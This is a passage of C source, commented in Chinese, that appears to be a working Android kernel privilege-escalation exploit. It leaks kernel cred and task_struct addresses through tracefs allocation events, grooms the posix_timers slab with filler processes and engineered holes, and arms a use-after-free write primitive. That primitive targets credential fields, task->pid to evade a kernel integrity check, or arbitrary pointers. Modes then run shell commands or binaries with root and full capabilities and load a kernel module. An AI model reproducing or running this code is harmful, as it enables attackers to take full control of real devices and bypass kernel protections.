                snprintf(tp, sizeof tp, "/data/local/tmp/xiaoyi-pilot/trace_c%d.txt", k);
                dump_trace(tp);
            }
        }
        printf("[C2] 全部完成。洁净父保持存活 30s（不退出、无孤儿）\n");
        fflush(stdout);
        sleep(30);
        printf("[C2b] 洁净父退出\n");
        fflush(stdout);
        return 0;
    }

single_round:
    g_ncpu = last_cpu() + 1;
    if (g_ncpu < 2) g_ncpu = 2;
    g_vcpu = 1 % g_ncpu;
    g_pcpu = 0;
    if (g_vcpu_fix >= 0 && g_vcpu_fix < g_ncpu) g_vcpu = g_vcpu_fix;
    if (g_spray_cpu >= g_ncpu) g_spray_cpu = g_ncpu - 1;
    g_self_tid = (int32_t)syscall(SYS_gettid);
    if (g_slide) {
        g_cred_cs = CRED_CS_LINK + g_slide;
        g_timer_cs = TIMER_CS_LINK + g_slide;
        g_task_cs = TASK_CS_LINK + g_slide;
        printf("[B0c] slide=%#llx (命令行 -s) cred_cs=%#llx timer_cs=%#llx task_cs=%#llx self_tid=%d\n",
               (unsigned long long)g_slide, (unsigned long long)g_cred_cs,
               (unsigned long long)g_timer_cs, (unsigned long long)g_task_cs, g_self_tid);
    } else {
        /* 未给 -s: 不猜, 也不用 root。call_site 是原始 text 地址, 第一条
         * req==0x110(timer_create) 记录即可反推 slide; 在此之前按 64KB
         * 页内偏移指纹匹配(与 slide 全等匹配等价, 因为 slide 按 64KB 对齐)。 */
        printf("[B0c] slide=auto (未给 -s, 由 timer 分配 call_site 反推; 无需 root) self_tid=%d\n",
               g_self_tid);
    }

    SH = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    g_rec = mmap(NULL, sizeof(struct rec) * MAXREC, PROT_READ | PROT_WRITE,
                 MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (SH == MAP_FAILED || g_rec == MAP_FAILED) { printf("[-] mmap\n"); return 1; }
    memset((void *)g_rec, 0, sizeof(struct rec) * 512);
    pin_cpu(g_pcpu);

    if (g_naio > 0) {
        g_aio_maxctx = g_naio * (g_rounds + 2) + 16;
        g_ctxs = mmap(NULL, sizeof(uint64_t) * (size_t)g_aio_maxctx,
                      PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
        if (g_ctxs == MAP_FAILED) { printf("[-] mmap ctxs\n"); return 1; }
        if (g_aioev < 1) g_aioev = 1;
        if (g_aioev > 65536) g_aioev = 65536;
        {
            unsigned long keep[4];
            int nk = 0;
            g_ring_pages = aio_measure_pages(g_aioev, keep, &nk);
            for (int i = 0; i < nk && g_nctx < g_aio_maxctx; i++) {
                g_ctxs[g_nctx++] = (uint64_t)keep[i];
            }
            printf("[B0e] AIO: ev=%d ring_pages=%zu maxctx=%d\n", g_aioev, g_ring_pages, g_aio_maxctx);
        }
    }

    printf("== wr1: pid=%d ncpu=%d vcpu=%d ntimer=%d nfill=%d npipe=%d clock=%s spray=%s\n",
           getpid(), g_ncpu, g_vcpu, g_ntimer, NFILL, g_npipe,
           g_thread_clock ? "THREAD(-t)" : "PROCESS",
           g_fspray_mb > 0 ? "file(-F)" : (g_naio > 0 ? "aio" : (g_cspray ? "cont(-c)" : "pipe")));
    printf("[B0a] 关键参数: thread_clock=%d file_spray=%dMB attempts=%d force_hit=%d selfverify=%d "
           "execpath='%s' kill_us=%d\n",
           g_thread_clock, g_fspray_mb, g_attempts, g_force_hit, g_dverify,
           g_xpath[0] ? g_xpath : "/proc/self/exe", g_kill_us);
    printf("[B0] uid=%d euid=%d gid=%d egid=%d\n", getuid(), geteuid(), getgid(), getegid());

    /* ---- P1: 纯 shell 只开 filemap；传统模式只开 kmem_cache_alloc ---- */
    relay_q("echo 0 > %s/tracing_on", TRACE_DIR);
    relay_q("echo %d > %s/buffer_size_kb", g_puresh ? 8192 : 16384, TRACE_DIR);
    relay_q("echo mono > %s/trace_clock", TRACE_DIR);
    if (g_puresh) {
        /* filemap add/delete 事件对 shell 放行；pfn 是十进制明文，不需要 raw pipe */
        ps_event("mm_filemap_add_to_page_cache", 1);
        ps_event("mm_filemap_delete_from_page_cache", 1);
        ps_wr(TRACE_DIR "/trace", "\n");
        ps_wr(TRACE_DIR "/tracing_on", "1");
        printf("[B0b] PURESH: filemap add/delete 已开 (纯 shell pfn 通道)\n");
    } else {
        relay_q("echo 0 > %s/events/enable", TRACE_DIR);
        if (g_lifetrace) {
            /* 生命周期取证: 谁给本进程发 SIGKILL / 本进程何时真正消失 */
            relay_q("echo 1 > %s/events/sched/sched_process_exit/enable", TRACE_DIR);
            relay_q("echo 1 > %s/events/signal/signal_generate/enable", TRACE_DIR);
            printf("[B0f] 生命周期 trace 已开: sched_process_exit + signal_generate\n");
        }
        relay_q("echo 1 > %s/events/kmem/kmem_cache_alloc/enable", TRACE_DIR);
        relay_q("echo > %s/trace", TRACE_DIR);
        relay_q("echo 1 > %s/tracing_on", TRACE_DIR);
        {
            char q[64] = { 0 };
            relay_sh("cat " TRACE_DIR "/events/kmem/kmem_cache_alloc/enable", q, sizeof q);
            printf("[B0b] kmem_cache_alloc/enable=%s", q[0] ? q : "?\n");
        }
        leak_start();
        usleep(120000);
    }
    g_nrec = 0;                    /* 丢弃 leak_start 之前的积压记录(relay fork 等) */
    g_dn = 0;                      /* 同时清诊断缓存下标: 否则 exec /proc/self/exe 的分配会占满 g_d[128], setresgid 的 cred 记录被丢弃 */
    __sync_synchronize();

    /* ---- P2: 泄漏自己的 cred + 一个"探针子进程"的 task_struct ----
     * 触发一次 prepare_creds 就会分配一个新 cred 对象 (cred_jar, object_size=0xa8)。
     * 选"只降不升"的安全操作: setresgid 写成当前值 → 值不变, 但内核必然
     * prepare_creds + commit_creds, 于是"最后一条 cred 记录"就是 current->cred。 */
round_begin:
    g_self_tid = (int32_t)syscall(SYS_gettid);
    if (g_noff) g_credoff = g_offs[g_wround];
    if (g_leak_tid) {
        /* -Z 外部靶: 同一个 cred 对象, 只换偏移。绝不能重新泄漏 —— 重新 setresgid
         * 会让内核换一个新 cred 对象, 上一轮写进去的结果就丢了。 */
        if (g_nop) {
            uint64_t t = g_ops_t[g_wround];
            g_target = (t < 0x1000000ULL) ? (g_probe_task + t) : t;
            printf("[R0p] 指针写第 %d/%d 轮: target=%#llx = %#llx\n",
                   g_wround + 1, g_nop, (unsigned long long)g_target,
                   (unsigned long long)g_ops_v[g_wround]);
        } else {
            g_target = g_cred + g_credoff;
        }
        if (g_wround > 0) {
            printf("[R0x] 洁净进程原地进入轮 %d/%d, 同一 cred=%#llx +%#llx → target=%#llx\n",
                   g_wround + 1, g_noff, (unsigned long long)g_cred,
                   (unsigned long long)g_credoff, (unsigned long long)g_target);
            sm("[SM] R0x 轮 %d/%d 开始 offset=%#llx target=%#llx",
               g_wround + 1, g_noff, (unsigned long long)g_credoff,
               (unsigned long long)g_target);
            relay_q("echo 0 > %s/tracing_on", TRACE_DIR);
            relay_q("echo 0 > %s/events/kmem/mm_page_alloc/enable", TRACE_DIR);
            relay_q("echo 0 > %s/events/kmem/mm_page_free/enable", TRACE_DIR);
            relay_q("echo 1 > %s/events/kmem/kmem_cache_alloc/enable", TRACE_DIR);
            relay_q("echo > %s/trace", TRACE_DIR);
            relay_q("echo 1 > %s/tracing_on", TRACE_DIR);
            g_dn = 0;
            leak_restart();          /* 只为新一轮的 victim timer 记录; 靶 cred 地址已缓存在 g_cred */
            usleep(120000);
            g_nrec = 0;
            __sync_synchronize();
        }
    } else if (g_wround > 0) {
        /* fork-per-round: 上一轮的成功结果已经在 fork 时由 copy_creds 复制进本进程,
         * 所以本进程开局就继承了已清零的字段。这里只需重新泄漏"本进程"的 cred 地址。 */
        printf("[R0] 子进程接管 pid=%d tid=%d 轮 %d/%d credoff=%#llx (fork 继承 uid=%d gid=%d)\n",
               getpid(), g_self_tid, g_wround + 1,
               g_noff ? g_noff : g_xrounds,
               (unsigned long long)g_credoff, (int)getuid(), (int)getgid());
        /* 关键: 上一轮在 arm 之后把 kmem 关了(改成 mm 事件 + pfn filter)。
         * 新进程必须重新打开 kmem_cache_alloc 并清 trace, 否则本轮的
         * prepare_creds / copy_process 分配一条都收不到 → [B1] records=0。 */
        relay_q("echo 0 > %s/tracing_on", TRACE_DIR);
        relay_q("echo 0 > %s/events/kmem/mm_page_alloc/enable", TRACE_DIR);
        relay_q("echo 0 > %s/events/kmem/mm_page_free/enable", TRACE_DIR);
        relay_q("echo 1 > %s/events/kmem/kmem_cache_alloc/enable", TRACE_DIR);
        relay_q("echo > %s/trace", TRACE_DIR);
        relay_q("echo 1 > %s/tracing_on", TRACE_DIR);
        g_dn = 0;
        leak_restart();
        usleep(120000);
        g_nrec = 0;
        __sync_synchronize();
    }
    pid_t probe = -1;
    if ((g_nop || g_selfprobe) && g_wround > 0 && g_probe_pid) {
        /* -P 多轮指针写: 必须始终改**同一个** task_struct。
         * 我们的 worker 自身始终保持 uid=2000(改的是 probe 子进程), 所以可以原地续轮,
         * 不需要 fork 新 probe, 也不再 setresgid(避免 g_probe_task 变成新子进程)。 */
        probe = (pid_t)g_probe_pid;
        printf("[B1p] 指针写: 复用第 0 轮 probe=%d (task=%#llx), 不再 fork/setresgid\n",
               (int)probe, (unsigned long long)g_probe_task);
        fflush(stdout);
    } else {
    if (g_ucmd && pipe(g_wake_fd) != 0) { g_wake_fd[0] = g_wake_fd[1] = -1; }
    if (g_ucmd && pipe(g_sel_fd) != 0) { g_sel_fd[0] = g_sel_fd[1] = -1; }
    probe = fork();
    if (probe == 0) {
        prctl(PR_SET_NAME, "wpAAAAAAABBBBBBBB", 0, 0, 0);
        pin_cpu(g_ncpu - 1);
        if (g_ucmd && g_sel_fd[1] >= 0) {
            /* 自检输出改走 pipe: kernel 域不能写日志文件, 但可以写 pipe */
            close(g_sel_fd[0]);
            dup2(g_sel_fd[1], 1);
            dup2(g_sel_fd[1], 2);
            if (g_sel_fd[1] != 1 && g_sel_fd[1] != 2) close(g_sel_fd[1]);
        }
        if (g_ucmd && g_wake_fd[0] >= 0) {
            /* -U: 等父进程放行后再执行命令。
             * -Y 与 -U(AAWL) 组合时, 父进程在泄漏阶段就会 kill(SIGUSR1) 让 probe 做
             * setresgid 刷新 cred, 所以信号处理器必须装在阻塞之前, 且不能 SA_RESTART,
             * 否则 read 会被自动重启, 拿不到 EINTR。 */
            char c = 0;
            close(g_wake_fd[1]);
            if (g_hkip) {
                struct sigaction sa;
                memset(&sa, 0, sizeof sa);
                sa.sa_handler = on_probe_usr1;
                sigemptyset(&sa.sa_mask);
                sa.sa_flags = 0;
                sigaction(SIGUSR1, &sa, NULL);
            }
            /* 方案二：此刻 probe 的 cred 还没被换（仍是 shell 域），先把 .ko 读进内存。
             * 换 cred 后是 init 域，读不到 /data/local/tmp（shell_data_file）。 */
            if (g_fakecred) fc_preload_module();
            {
                int kf = open("/dev/kmsg", O_WRONLY | O_NONBLOCK);
                if (kf >= 0) {
                    char kb[96];
                    int kn = snprintf(kb, sizeof kb, "[PRB] probe wake-wait fd0=%d fd1=%d\n",
                                      g_wake_fd[0], g_wake_fd[1]);
                    if (kn > 0) { if (write(kf, kb, (size_t)kn) < 0) {} }
                    close(kf);
                }
            }
            long wok = -999;
            for (;;) {
                /* 用 poll 定时复查: -Y 的 SIGUSR1 可能在 probe 进入 read 之前
                 * (如 fc_preload_module 期间) 就已到达, 只靠 read 的 EINTR 会漏掉,
                 * 导致父进程扫描时拿不到 probe 的 cred 记录。 */
                struct pollfd pf;
                pf.fd = g_wake_fd[0]; pf.events = POLLIN; pf.revents = 0;
                int pr = poll(&pf, 1, 100);
                if (pr > 0) {
                    ssize_t rr = read(g_wake_fd[0], &c, 1);
                    if (rr >= 0) { wok = (long)rr; break; }  /* 0=EOF / 1=放行 */
                    if (errno != EINTR && errno != EAGAIN) { wok = -errno; break; }
                }
                if (g_hkip && on_probe_usr1_fired()) {
                    on_probe_usr1_clear();
                    long rc = syscall(SYS_setresgid, getgid(), getgid(), getgid());
                    printf("[HKp] probe %d setresgid rc=%ld\n", (int)getpid(), rc);
                    fflush(stdout);
                }
            }
            {
                int kf = open("/dev/kmsg", O_WRONLY | O_NONBLOCK);
                if (kf >= 0) {
                    char kb[96];
                    int kn = snprintf(kb, sizeof kb, "[PRB] probe woke rr=%ld errno=%d\n", wok, errno);
                    if (kn > 0) { if (write(kf, kb, (size_t)kn) < 0) {} }
                    close(kf);
                }
            }
            if (g_fakecred) fakecred_run();     /* 父已扫描到 init sid 并放行，这里永不返回 */
            if (!strcmp(g_ucmd, "SELFTEST")) { int m = kdom_selftest(); _exit(m & 0xff); }
            if (!strcmp(g_ucmd, "KFORK")) {
                /* 已在 kernel 域(uid0+满cap): fork 继承子进程, setsid 脱离原进程组,
                 * 父 probe 立即退出断开跟踪链; 子进程只用 prctl 改进程名做心跳,
                 * 不 fork / 不 exec / 不 exit, 由外部 ps 观察存活窗口 */
                pid_t kc = fork();
                if (kc == 0) {
                    setsid();
                    signal(SIGHUP, SIG_IGN);
                    signal(SIGINT, SIG_IGN);
                    signal(SIGTERM, SIG_IGN);
                    for (int i = 0; i < 60; i++) {
                        char knm[16];
                        snprintf(knm, sizeof knm, "KZ%02d", i);
                        prctl(PR_SET_NAME, knm, 0, 0, 0);
                        usleep(500000);
                    }
                    _exit(0);
                }
                _exit(0);
            }
            if (!strcmp(g_ucmd, "NSLEEP")) {
                /* kernel 域存活窗口测量: 本进程已在 kernel 域, 不 fork / 不 exec / 不 exit,
                 * 只把 comm 改成 KD0000..KD1799 做心跳(改 comm 是纯内存操作, kernel 域可做),
                 * 外部按 comm 采样即可得到该域下进程的真实存活时长 */
                for (int i = 0; i < 1800; i++) {
                    char knm[16];
                    snprintf(knm, sizeof knm, "KD%04d", i);
                    prctl(PR_SET_NAME, knm, 0, 0, 0);
                    usleep(100000);
                }
                _exit(0);
            }
            if (g_uexec_direct)
                execl(g_uexec, g_uexec, (char *)NULL);          /* AAWX: 直接 execve，不经 sh */
            else
                execl("/system/bin/sh", "sh", "-c", g_uexec ? g_uexec : g_ucmd, (char *)NULL);
            _exit(127);
        }
        if (g_hkip) {
            /* -Y: probe 自己响应 SIGUSR1 做 setresgid → 它成为"最后一条 cred 记录"
             * 的归属者, 父进程据此拿到 probe 的 cred 地址; probe 永不退出。 */
            signal(SIGUSR1, on_probe_usr1);
            for (;;) {
                pause();
                if (on_probe_usr1_fired()) {
                    on_probe_usr1_clear();
                    long rc = syscall(SYS_setresgid, getgid(), getgid(), getgid());
                    printf("[HKp] probe %d setresgid rc=%ld\n", (int)getpid(), rc);
                    fflush(stdout);
                }
            }
        }
        for (;;) pause();
    }
    g_probe_pid = (int)probe;
    if (g_ucmd && g_wake_fd[0] >= 0) { close(g_wake_fd[0]); g_wake_fd[0] = -1; }
    if (g_sel_fd[1] >= 0) { close(g_sel_fd[1]); g_sel_fd[1] = -1; }   /* 只留读端, 否则读不到 EOF */
    usleep(120000);
    if (g_hkip) {
        printf("[B1a] -Y: 请求 probe=%d 刷新 cred (不再由父进程 setresgid, 避免记录归属错乱)\n", (int)probe);
        fflush(stdout);
        kill(probe, SIGUSR1);
        usleep(300000);
    } else {
        long rc = syscall(SYS_setresgid, getgid(), getgid(), getgid());
        printf("[B1a] probe=%d setresgid(%d)=%ld errno=%d\n", probe, getgid(), rc, errno);
    }
    usleep(150000);
    {
        int nd = g_dn < 128 ? g_dn : 128;
        printf("[B1b] 本进程 kmem_cache_alloc 记录 %d 条, 最后 6 条:\n", nd);
        for (int i = (nd > 6 ? nd - 6 : 0); i < nd; i++)
            printf("       cs=%#llx req=%u(%#x)\n",
                   (unsigned long long)g_d[i].cs, g_d[i].req, g_d[i].req);
    }
    }
    {
        int c = 0, ct = 0;
        int32_t ltid = g_hkip ? (int32_t)g_probe_pid
                              : (g_leak_tid ? g_leak_tid : g_self_tid);
        /* -Z 外部靶: 只在第 1 轮泄漏一次 cred。后续轮次绝不能再来一次 setresgid,
         * 否则 prepare_creds 会换掉靶的 cred 对象, 前一轮写进去的值虽然会被复制,
         * 但地址变了 → 上一轮的 target 变成已释放对象, 继续写就是 UAF 写 → panic。 */
        int reuse = ((g_leak_tid || g_nop || g_selfprobe) && g_wround > 0 && g_cred);
        if (!reuse) {
            if (g_leak_tid) {
                /* 外部靶 task: 让它做一次 setresgid 触发 prepare_creds,
                 * 这条 kmem_cache_alloc(cred_jar) 的 trace 行会带它的 pid。 */
                printf("[B0e] 请求外部靶 task %d 刷新 cred ...\n", (int)ltid);
                fflush(stdout);
                if (kill(ltid, SIGUSR1) != 0)
                    printf("[!] kill(%d,SIGUSR1) errno=%d(%s)\n", (int)ltid, errno, strerror(errno));
                usleep(300000);
            }
            g_cred = pick_last(ltid, 0, &c);
            /* task_struct 记录的归属者是 fork 的**父**进程, 所以 -Y 用 self_tid 过滤 */
            uint64_t ptask = pick_last(g_hkip ? (int32_t)g_self_tid : ltid, 2, &ct);
            sm("[SM] B1 leak tid=%d cred=%#llx recs=%d (轮 %d/%d off=%#llx)",
               (int)ltid, (unsigned long long)g_cred, c, g_wround + 1, g_noff,
               (unsigned long long)g_credoff);
            printf("[B1] cred: records=%d va=%#llx | probe_task: records=%d va=%#llx (tid=%d)\n",
                   c, (unsigned long long)g_cred, ct, (unsigned long long)ptask, (int)ltid);
            printf("[B1c] cred 记录:\n");
            dump_kind(ltid, 0, 8);
            printf("[B1c] task 记录:\n");
            dump_kind(g_hkip ? (int32_t)g_self_tid : ltid, 2, 8);
            /* -P 只有在用相对偏移(<0x1000000, 即 g_probe_task+off)时才需要靶的
             * task_struct; 写绝对地址(如 .data)并不依赖它。靶只 pause 不 fork 时
             * trace 里没有 kind=2 记录, 不应因此中止。 */
            int need_ptask = g_tmode || g_ucmd || g_hkip ||
                             (g_nop && g_ops_t[g_wround] < 0x1000000ULL);
            if (need_ptask) {
                g_probe_task = ptask;
                if (!ptask) { printf("[-] probe task 泄漏失败\n"); leak_stop(); return 2; }
            } else {
                g_probe_task = 0;
                printf("[B1] -P 绝对地址写: 跳过 probe_task 依赖 (records=%d)\n", ct);
            }
        } else {
            sm("[SM] B1 复用缓存 cred=%#llx (轮 %d/%d off=%#llx, 不再刷新靶 cred)",
               (unsigned long long)g_cred, g_wround + 1, g_noff, (unsigned long long)g_credoff);
            printf("[B1] 复用缓存 cred=%#llx (轮 %d/%d off=%#llx)\n",
                   (unsigned long long)g_cred, g_wround + 1, g_noff,
                   (unsigned long long)g_credoff);
        }
        if (g_cred == 0 && !g_insert) { printf("[-] cred 泄漏失败\n"); leak_stop(); return 2; }
        if (g_insert) {
            printf("[B1] 目标模式=stage1 插入 misc_list (不需要 cred 地址)\n");
        } else if (g_hkip) {
            /* -Y: 只清 probe 的 task->pid (0x878), 让它被 HKIP 视为 idle 白名单 */
            g_target = g_probe_task + 0x878ULL;
            printf("[B1] 目标模式=HKIP pid: %#llx (probe_task=%#llx +0x878)\n",
                   (unsigned long long)g_target, (unsigned long long)g_probe_task);
        } else if (g_nop) {
            uint64_t t = g_ops_t[g_wround];
            g_target = (t < 0x1000000ULL) ? (g_probe_task + t) : t;
            printf("[B1] 目标模式=指针写: %#llx = %#llx (ptask=%#llx)\n",
                   (unsigned long long)g_target, (unsigned long long)g_ops_v[g_wround],
                   (unsigned long long)g_probe_task);
        } else if (g_tmode) {
            uint64_t ptask = g_probe_task;
            g_target = ptask + 0xa58;          /* task_struct->comm */
            printf("[B1] 目标模式=comm: %#llx\n", (unsigned long long)g_target);
        } else {
            g_target = g_cred + g_credoff;
            printf("[B1] 目标模式=cred+%#llx: %#llx\n",
                   (unsigned long long)g_credoff, (unsigned long long)g_target);
        }
    }

    /* ---- P4: fillers（只第 1 轮创建；它们作为独立进程在父退出后依然存活,
     * 继续提供 partial slab 压力） ---- */
    if (g_wround == 0) {
    int fillp[2];
    if (pipe(fillp)) { printf("[-] pipe fill\n"); return 3; }
    for (int i = 0; i < NFILL; i++) {
        pid_t f = fork();
        if (f == 0) {
            close(fillp[0]);
            _exit(filler_main(i, fillp[1]));
        }
    }
    close(fillp[1]);
    {
        char got[NFILL + 1] = { 0 };
        int n = 0;
        while (n < NFILL) {
            ssize_t r = read(fillp[0], got + n, NFILL - n);
            if (r <= 0) break;
            n += (int)r;
        }
        close(fillp[0]);
        printf("[B6] fillers ready=%d [%s]\n", n, got);
        if (n < NFILL) printf("[!] filler 不足, 闸门很可能不过\n");
    }
    }

    /* ---- P5..P9: 尝试循环（miss 安全，可重试） ----
     * 闸门判定改用 tracefs pfn 过滤器 + 非消费型文本 trace, 不再用 trace_pipe
     * （排队的 ssh 式噪声会把目标事件冲掉, 造成假阴性）。 */
    pid_t victim = -1;
    int tid = 0;
    int at = 0;

    {
        char cg[256] = { 0 };
        int f = open("/proc/self/cgroup", O_RDONLY);
        if (f >= 0) { ssize_t r = read(f, cg, sizeof cg - 1); close(f); if (r > 0) { cg[r] = 0; char *nl = strchr(cg, '\n'); if (nl) *nl = 0; } }
        printf("[R0b] 轮 %d/%d t=%lldms pid=%d pgid=%d sid=%d oom=%d cgroup=[%s]\n",
               g_wround + 1, g_noff ? g_noff : 1, now_us() / 1000, getpid(), getpgrp(),
               getsid(0), ({ int v = -1; int g = open("/proc/self/oom_score_adj", O_RDONLY);
                             if (g >= 0) { char b[16] = {0}; if (read(g, b, 15) > 0) v = atoi(b); close(g); } v; }), cg);
    }
    if (g_nop) {
        uint64_t t = g_ops_t[g_wround];
        g_target = (t < 0x1000000ULL) ? (g_probe_task + t) : t;
        printf("==== 指针写第 %d/%d 轮: %#llx = %#llx ====\n", g_wround + 1, g_nop,
               (unsigned long long)g_target, (unsigned long long)g_ops_v[g_wround]);
    } else if (g_noff) {
        g_credoff = g_offs[g_wround];
        if (!g_tmode) g_target = g_cred + g_credoff;
        printf("==== 写链第 %d/%d 轮: cred+%#llx = %#llx ====\n", g_wround + 1, g_noff,
               (unsigned long long)g_credoff, (unsigned long long)g_target);
    }
    for (at = 1; at <= g_attempts; at++) {
        printf("---- attempt %d/%d ----\n", at, g_attempts);
        SH->gen++;
        SH->stop = 0;
        SH->exec_tid = 0; SH->killer_ready = 0; SH->killed = 0;
        SH->t_go = SH->t_det = SH->t_kill = 0;
        g_w_free = 0; g_w_free_ts = 0;
        g_w_a1 = g_w_a2 = 0; g_w_a1_ts = g_w_a2_ts = 0;
        (void)0;

        /* kmem 开 / mm 关 / 清 trace。
         * 纯 shell 没有 kmem 权限，且 raw pipe 读线程会**抽干** ring buffer，
         * 让 ps_scan_adds 读到的 filemap 事件恒为 0 → 这里必须整段跳过。 */
        if (g_puresh) {
            wr_rc(TRACE_DIR "/trace", "\n");
            g_nrec = 0;
            __sync_synchronize();
        } else {
        relay_q("echo 0 > %s/events/kmem/mm_page_alloc/enable", TRACE_DIR);
        relay_q("echo 0 > %s/events/kmem/mm_page_free/enable", TRACE_DIR);
        relay_q("echo 1 > %s/events/kmem/kmem_cache_alloc/enable", TRACE_DIR);
        relay_q("echo > %s/trace", TRACE_DIR);
        g_nrec = 0;                        /* 每轮重置, 避免历史记录污染分组/序号 */
        __sync_synchronize();
        leak_start();
        usleep(20000);
        }

        int c2p[2], p2c[2];
        if (pipe(c2p) || pipe(p2c)) { printf("[-] pipe\n"); return 3; }
        /* 先填洞 —— 这是历史成功配方里最容易被忽略的一条, 也是本次 nfree=0 的根因:
         * cache 里存在空闲对象(空洞)时, 那些 slab 是 SLUB 的 partial slab;
         * victim 的 30/30 slab 变空后, SLUB 直接从 partial 里留作备用, **不会**
         * discard_slab, 于是永远没有 mm_page_free(order=1) 事件, 8KB 块也回不到 buddy。
         * 把空洞全部填掉之后, partial 为空, victim 的 slab 一变空就必然 discard。 */
        g_holes = 0;
        if (g_autoholes) {
            for (int pass = 0; pass < 3; pass++) {
                int hh = slab_holes("posix_timers_cache");
                if (hh <= 0) break;
                if ((int)g_holecnt >= MAXHOLE - 1) { printf("[B2h] filler 表满\n"); break; }
                if (hh > 4096) hh = 4096;
                if (fill_holes(hh) != 0) break;
                usleep(150000);
            }
            g_holes = slab_holes("posix_timers_cache");
            printf("[B2h] 填洞后 holes=%d (filler 进程=%d)\n", g_holes, (int)g_holecnt);
        }
        /* 纯 shell 的空洞在 fork 之后、victim 分配 timer 之前创建（见下方握手）。 */
        int oldtid = tid;
        pid_t v = fork();
        if (v < 0) { printf("[-] fork victim\n"); return 3; }
        if (v == 0) {
            close(c2p[0]); close(p2c[1]);
            g_wfd = c2p[1]; g_rfd = p2c[0];
            victim_main();
        }
        close(c2p[1]); close(p2c[0]);
        victim = v;
        g_wfd = c2p[0]; g_rfd = p2c[1];
        SH->tgid = (int)victim;
        (void)oldtid;

        int okc = 0;
        if (xread(g_wfd, &tid, 4)) {
            printf("[-] victim 握手失败\n");
            kill(victim, SIGKILL); waitpid(victim, NULL, 0);
            leak_stop();
            continue;
        }
        if (g_puresh) {
            /* fork/pthread 已完成，现在才造空洞 → victim 的 timer slab 紧接着来拿 */
            int hp = ps_make_holes(g_ps_npair);
            if (hp <= 0) {
                printf("[-] PURESH: 空洞建立失败 (%d), 重试\n", hp);
                kill(victim, SIGKILL); waitpid(victim, NULL, 0);
                continue;
            }
            char hb = 1;
            if (xwrite(g_rfd, &hb, 1)) {
                printf("[-] PURESH: 空洞握手失败\n");
                kill(victim, SIGKILL); waitpid(victim, NULL, 0);
                continue;
            }
        }
        if (xread(g_wfd, &okc, 4)) {
            printf("[-] victim 握手失败\n");
            kill(victim, SIGKILL); waitpid(victim, NULL, 0);
            leak_stop();
            continue;
        }
        g_watch = tid;
        usleep(300000);
        leak_stop();

        /* 按 4K 页分组, 挑一个"30/30 全是我们"且不是最后(active)的 slab */
        int arm_i = -1;
        if (g_puresh) {
            /* 纯 shell: 没有 kmem 记录可分组。空洞在 victim 就绪、分配 timer 之前建好,
             * victim 的 slab(order-1) 优先从这些空洞里拿; 取"第一个满 slab 的
             * 最后一个对象"作为武装点, 与历史成功配方 arm_i=last_idx-1 一致:
             *   - 前 g_holes 个 timer 填已有空洞(散落在旧 slab),
             *   - 之后从新 slab 连续分配, 第一个满 slab 的最后对象 = g_holes+29。
             * 节点预测在 8KB 块 tail 页 off=0xf58 (29*0x110 + KIT_NODE=0x88)。 */
            arm_i = g_holes + NPF - 1;
            if (arm_i >= okc) arm_i = okc - 1;
            if (arm_i < 0) {
                printf("[-] PURESH: arm_i 非法 (okc=%d)\n", okc);
                kill(victim, SIGKILL); waitpid(victim, NULL, 0);
                continue;
            }
            printf("[PS] victim=%d timers=%d holes=%d arm_i=%d (首个满 slab 的最后对象)\n",
                   victim, okc, g_holes, arm_i);
            goto ps_arm;
        }
        static struct pgrp gp[512];
        int tot = 0;
        int ng = group_pfns(tid, gp, 512, &tot);
        int pfn_last = 0;
        {
            int c2 = 0;
            uint64_t lva = pick_last(tid, 1, &c2);
            if (lva) pfn_last = (int)((((lva & ~0xfffULL) - PAGE_OFFSET) >> 12) & ~1ULL);
            printf("[B2] victim=%d tid=%d timers=%d holes=%d | recs=%d slabs=%d last_slab=%d"
                   " | slide=%s%#llx\n",
                   victim, tid, okc, g_holes, tot, ng, pfn_last,
                   g_slide ? "" : "auto=",
                   (unsigned long long)(g_slide ? g_slide : g_slide_auto));
        }
        /* 选 slab: 只要求"30/30 全是我们", 且不是 active slab。
         * 选点必须用 **last_idx**(该 slab 里最后创建的那个 timer) —— 这是历史 7 次
         * 写原语成功与所有失败之间唯一的、可验证的差异:
         *   F1 / C1 / C2 / C3 / C4 / X  没有 "[B2a] 已重选 arm_i" 这一行, 一律 arm_i=last_idx-1 → 全部写成。
         *   run2_D1 / X2 / X30 / X100 / R2 / R5 都打了 "[B2a] 已重选 arm_i=NNN"
         *   (把 arm_i 改到别的对象上) → GATE=PASS、status=0x9, 但 [D]/B18 全是 NO EFFECT。
         * 原因: exit_itimers 用 hlist_add_head 的顺序处理, 被跳过摘链的是 hlist 头部
         * (最后创建) 那个 node; 换成别的对象, 我们的假节点就不在树上被遍历到的那条路径上。 */
        int best = -1, c30 = 0;
        for (int i = 0; i < ng; i++) if (gp[i].cnt == NPF) c30++;
        printf("[B2d] groups=%d 满30=%d | 前 8 组(cnt:pfn):", ng, c30);
        for (int i = 0; i < ng && i < 8; i++)
            printf(" %d:%llu", gp[i].cnt, (unsigned long long)gp[i].pfn);
        printf("\n");
        for (int i = 0; i < ng; i++) {
            if (gp[i].cnt != NPF) continue;
            if ((int)(gp[i].pfn) == pfn_last) continue;      /* active slab 不放 */
            /* exit_itimers 走 hlist_add_head 的逆序 = 新建的先释放,
             * 所以"最先变空"的 5 个 slab 会被 SLUB 当作 nr_partial 常备量留下,
             * 之后变空的才会 discard_slab。要拿回 buddy, 必须挑**最早创建**的那个。 */
            if (best < 0 || gp[i].last_idx < gp[best].last_idx) best = i;
        }
        if (best < 0) {
            printf("   -> 没有 30/30 独占 slab, 重试\n");
            kill(victim, SIGKILL); waitpid(victim, NULL, 0);
            continue;
        }
        arm_i = gp[best].last_idx - 1;                       /* tv 下标 (0-based) */
        {
            uint64_t tva = gp[best].last_va;
            g_node_va = tva + KIT_NODE;
            g_node_pfn = ((g_node_va & ~0xfffULL) - PAGE_OFFSET) >> 12;
            g_head_pfn = g_node_pfn & ~1ULL;
            unsigned noff = (unsigned)(g_node_va & 0xfffULL);
            /* 只要求 rb_node(24B) 不跨页 —— 目标就是"node 所在的那一页", 它可能是
             * head 也可能是 tail。历史成功日志里 node off=0xf58、pfn=head+1(tail),
             * 而 [B13] 里 mine=1 证明 order-0 照样能抢到 tail 那半块, 所以不必强求 head 页。 */
            printf("[B2a] arm_i=%d = last_idx-1 (最后创建的 timer; addr=%#llx)\n",
                   arm_i, (unsigned long long)tva);
